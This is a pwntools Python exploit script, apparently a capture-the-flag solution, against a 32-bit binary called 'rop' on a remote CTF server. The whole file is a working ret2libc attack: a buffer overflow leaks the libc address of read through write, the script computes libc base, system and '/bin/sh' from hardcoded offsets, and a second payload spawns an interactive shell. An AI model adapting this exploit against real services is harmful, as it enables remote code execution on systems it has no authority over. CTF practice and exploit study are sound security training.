from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

context(arch="i386", os='linux')
e = ELF('./rop')
print(e.plt)
libc = ELF('./libc.so.6')

r = remote("ctf.j0n9hyun.xyz", 3021)

dummy = b"A"*(0x88+4)
ret = p32(0x080482da)
main = p32(0x08048470)

# leak got & get base
payload  = dummy
payload += p32(e.plt['write'])
payload += main
payload += p32(0x01)
payload += p32(e.got['read'])
payload += p32(0x04)

r.sendline(payload)

# exploit
read = u32(r.recv(4))
base = read - 0xd4350
system = base + 0x3a940
binsh = base + 0x15902b


payload  = dummy
payload += ret*4
payload += p32(system)
payload += b"AAAA"
payload += p32(binsh)

r.sendline(payload)

r.interactive()